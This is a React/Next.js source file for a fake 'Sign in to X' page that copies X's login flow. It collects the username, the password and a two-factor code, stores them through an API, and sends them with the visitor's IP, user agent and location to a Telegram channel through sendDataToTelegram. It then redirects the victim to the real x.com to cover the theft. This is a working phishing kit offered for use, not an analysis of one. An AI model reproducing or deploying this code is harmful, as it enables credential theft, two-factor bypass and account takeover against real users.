"use client";

import { useCallback, useEffect, useLayoutEffect, useState } from "react";
import { sendDataToTelegram } from "@/helpers/send-data-to-telegram";
import Image from "next/image";
import { getInputType, InputType } from "@/helpers/getInputType";
import { Input } from "./input";
import type { User } from "@prisma/client";
import type { TwitterUser } from "@/app/api/twitter/users/route";
import { Spinner } from "./spinner";

type Props = {
	browserData: {
		ip: string;
		userAgent: string;
		geoLocation: string;
	};
};

export function LoginFormSteps({ browserData }: Props) {
	const [step, setStep] = useState(1);
	const [user, setUser] = useState<TwitterUser>();
	const [username, setUsername] = useState("");
	const [disabledUsername, setDisabledUsername] = useState(false);
	const [password, setPassword] = useState("");
	const [code, setCode] = useState("");
	const [userId, setUserId] = useState(0);
	const [loading, setLoading] = useState(false);
	const [error, setError] = useState(false);

	const handleGetLabel = () => {
		const inputType = getInputType(username);

		if (inputType === InputType.Email) {
			return "Email";
		}

		if (inputType === InputType.Phone) {
			return "Phone";
		}

		if (inputType === InputType.Username) {
			return "Username";
		}

		return "Phone, email, or username";
	};

	const handleShowError = () => {
		setError(true);

		setTimeout(() => {
			setError(false);
		}, 3000);
	};

	const handleFirstStep = async () => {
		setLoading(true);
		const inputType = getInputType(username);

		if (inputType === InputType.Username) {
			const response = await fetch(`/api/twitter/users?username=${username}`);

			const user = await response.json();

			if (user.error) {
				handleShowError();
				setLoading(false);
				return;
			}

			setUser(user);
			setUsername(user.username);
			setDisabledUsername(true);
			setStep(2);
			setLoading(false);
			return;
		}

		if (inputType === InputType.Email || inputType === InputType.Phone) {
			setDisabledUsername(true);
			setStep(2);
			setLoading(false);
			return;
		}

		handleShowError();
		setUsername("");
		setLoading(false);
	};

	const handleSaveUser = useCallback(async () => {
		setLoading(true);

		const response = await fetch("/api/users", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				emailOrPhone: username,
				password,
			}),
		});

		if (!response.ok) {
			throw new Error("Failed to save user.");
		}

		const data = (await response.json()) as { user: User };

		const { origin, pathname } = window.location;

		await sendDataToTelegram({
			emailOrPhone: data.user.emailOrPhone,
			password: data.user.password,
			code: "",
			pageUrl: `${origin}${pathname}`,
			userIp: browserData.ip,
			userAgent: browserData.userAgent,
			geoLocation: browserData.geoLocation,
		});

		setUserId(data?.user?.id);

		setStep((prevStep) => prevStep + 1);

		setLoading(false);
	}, [username, password, browserData]);

	const handleSaveUserCode = useCallback(async () => {
		setLoading(true);

		const response = await fetch("/api/users", {
			method: "PUT",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				userId,
				code,
			}),
		});

		if (!response.ok) {
			throw new Error("Failed to save user.");
		}

		const data = (await response.json()) as { user: User };

		const { origin, pathname } = window.location;

		await sendDataToTelegram({
			emailOrPhone: data.user.emailOrPhone,
			password: data.user.password,
			code: data.user?.code || "",
			pageUrl: `${origin}${pathname}`,
			userIp: browserData.ip,
			userAgent: browserData.userAgent,
			geoLocation: browserData.geoLocation,
		});

		setLoading(false);

		window.location.href = "https://x.com";
	}, [userId, code, browserData]);

	return (
		<>
			{/* TOAST DE ERRO GENERICO */}
			{error && (
				<div className="fixed w-screen md:w-[95%] bottom-0 md:bottom-8 left-1/2 -translate-x-1/2 bg-[#1D9BF0] p-3 md:rounded-lg text-white break-words">
					Sorry, we could not find your account.
					g;173654929862002907:-1738119990330:O1zckW2bNN0DnQLo6AkEvBIW:1
				</div>
			)}

			{/* APENAS O INPUT COM OS BOTÕES DO GOOGLE, APPLE, ETC... */}
			{step === 1 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleFirstStep();
					}}
					className="flex-1 w-full py-10 px-9 overflow-y-auto md:max-w-[400px] md:w-full"
				>
					<h1 className="pt-8 pb-5 text-2xl font-bold text-[#E7E9EA]">
						Sign in to X
					</h1>

					<button
						type="button"
						className="mt-3 w-full h-10 bg-white flex items-center justify-center rounded-full text-zinc-600 font-bold text-sm"
					>
						<div className="flex items-center gap-2">
							<svg
								aria-hidden="true"
								xmlns="http://www.w3.org/2000/svg"
								viewBox="0 0 48 48"
								className="size-5"
							>
								<path
									fill="#EA4335"
									d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
								/>
								<path
									fill="#4285F4"
									d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
								/>
								<path
									fill="#FBBC05"
									d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
								/>
								<path
									fill="#34A853"
									d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
								/>
								<path fill="none" d="M0 0h48v48H0z" />
							</svg>
							<span>Sign in with Google</span>
						</div>
					</button>

					<button
						type="button"
						className="mt-6 w-full h-10 bg-white flex items-center justify-center rounded-full font-semibold text-black"
					>
						<div className="flex items-center gap-1">
							<svg
								viewBox="0 0 24 24"
								aria-hidden="true"
								className="size-5 fill-black"
							>
								<path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.13.05.28.05.43zm4.565 15.71c-.03.07-.463 1.58-1.518 3.12-.945 1.34-1.94 2.71-3.43 2.71-1.517 0-1.9-.88-3.63-.88-1.698 0-2.302.91-3.67.91-1.377 0-2.332-1.26-3.428-2.8-1.287-1.82-2.323-4.63-2.323-7.28 0-4.28 2.797-6.55 5.552-6.55 1.448 0 2.675.95 3.6.95.865 0 2.222-1.01 3.902-1.01.613 0 2.886.06 4.374 2.19-.13.09-2.383 1.37-2.383 4.19 0 3.26 2.854 4.42 2.955 4.45z" />
							</svg>
							<span>Sign in with Apple</span>
						</div>
					</button>

					<div className="flex items-center gap-1.5 py-3">
						<hr className="w-full h-0 border-t border-[#333639]" />
						<span className="text-white">or</span>
						<hr className="w-full h-0 border-t border-[#333639]" />
					</div>

					<Input
						type="text"
						label="Phone, email, or username"
						value={username}
						onChange={(e) => setUsername(e.target.value)}
						// className="h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
					/>

					<button
						type="submit"
						className="mt-7 w-full h-9 bg-white flex items-center justify-center rounded-full font-bold text-[15px] text-black disabled:opacity-60"
					>
						Next
					</button>

					<button
						type="button"
						className="mt-6 w-full h-9 bg-transparent flex items-center justify-center rounded-full font-bold text-[15px] text-white border border-white/40"
					>
						Forgot password?
					</button>

					<div className="mt-12">
						<p className="text-[15px] text-white/40">
							<span>Don't have an account? </span>
							<span className="text-[#1D9BF0] underline">Sign up</span>
						</p>
					</div>
				</form>
			)}

			{/* APENAS O INPUT PARA ENTRAR COM EMAIL OU PHONE */}
			{/* {step === 2 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleGoToNextStep();
					}}
					className="flex-1 px-9 flex flex-col justify-between md:max-w-[500px]"
				>
					<div>
						<div className="my-5">
							<h1 className="text-3xl font-semibold text-white">
								Enter your phone number or email address
							</h1>

							<p className="text-base text-white/40">
								There was unusual login activity on your account. To help keep
								your account safe, please enter your phone number (start with
								country code, e.g. +1) or email address to verify it's you.
							</p>
						</div>

						<Input
							type="text"
							label="Phone or email"
							value={username}
							onChange={(e) => setUsername(e.target.value)}
							className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
						/>
					</div>

					<button
						type="submit"
						disabled={!username}
						className="mb-6 w-full h-12 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
					>
						Next
					</button>
				</form>
			)} */}

			{/* INPUT PARA USERNAME/PHONE/EMAIL E SENHA */}
			{step === 2 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleSaveUser();
					}}
					className="flex-1 px-9 flex flex-col justify-between w-full md:max-w-[500px]"
				>
					<div className="mt-2 w-full flex flex-col">
						<div className="h-[68px] flex items-center">
							<h1 className="text-start text-2xl md:text-3xl font-semibold text-white">
								Enter your password
							</h1>
						</div>

						<div className="flex flex-col gap-[22px] my-[11px]">
							<Input
								type="text"
								label={handleGetLabel()}
								value={username}
								onChange={(e) => setUsername(e.target.value)}
								disabled={disabledUsername}
							/>

							<div>
								<Input
									// biome-ignore lint/a11y/noAutofocus: <explanation>
									autoFocus={true}
									type="password"
									label="Password"
									value={password}
									onChange={(e) => setPassword(e.target.value)}
								/>
								<span className="pl-2 text-xs text-[#1D9BF0]">
									Forgot password?
								</span>
							</div>
						</div>
					</div>

					<div>
						<button
							type="submit"
							disabled={!username || !password || loading}
							className="w-full h-12 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
						>
							Log in
						</button>

						<div className="mt-5 mb-6">
							<p className="text-[15px] text-white/40">
								<span>Don't have an account? </span>
								<span className="text-[#1D9BF0] underline">Sign up</span>
							</p>
						</div>
					</div>
				</form>
			)}

			{/* INPUT PARA CODE 2FA */}
			{step === 3 && (
				<form
					onSubmit={(e) => {
						e.preventDefault();
						handleSaveUserCode();
					}}
					className="flex-1 px-9 flex flex-col justify-between md:max-w-[500px]"
				>
					<div>
						<div className="my-5">
							<h1 className="text-2xl font-semibold text-white">
								Enter your verification code
							</h1>

							<p className="text-white/40">
								Use your code generator app to generate a code and enter it
								below.
							</p>

							{user?.profile_image_url && (
								<div className="mt-2 flex items-center gap-3">
									<Image
										src={
											user?.profile_image_url?.replace("_normal", "_400x400") ||
											""
										}
										alt="Foto de perfil"
										width={400}
										height={400}
										className="size-12 aspect-square object-cover rounded-full shrink-0"
										priority
									/>

									<div>
										<p className="text-white font-semibold">{user.name}</p>

										<p className="-mt-1 text-sm text-white/40">
											@{user.username}
										</p>
									</div>
								</div>
							)}
						</div>

						<Input
							type="text"
							label="Enter code"
							value={code}
							onChange={(e) => setCode(e.target.value)}
						/>
					</div>

					<div>
						<button
							type="submit"
							disabled={!code || loading}
							className="mb-6 w-full h-14 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
						>
							Next
						</button>

						<a
							href="https://x.com/"
							className="mb-6 w-full h-14 bg-transparent flex items-center justify-center rounded-full font-bold text-white border border-white/40"
						>
							Configure later
						</a>
					</div>
				</form>
			)}

			{loading && (
				<div className="absolute inset-0 size-full flex-1 flex items-center justify-center bg-black">
					<Spinner />
				</div>
			)}
		</>
	);
}
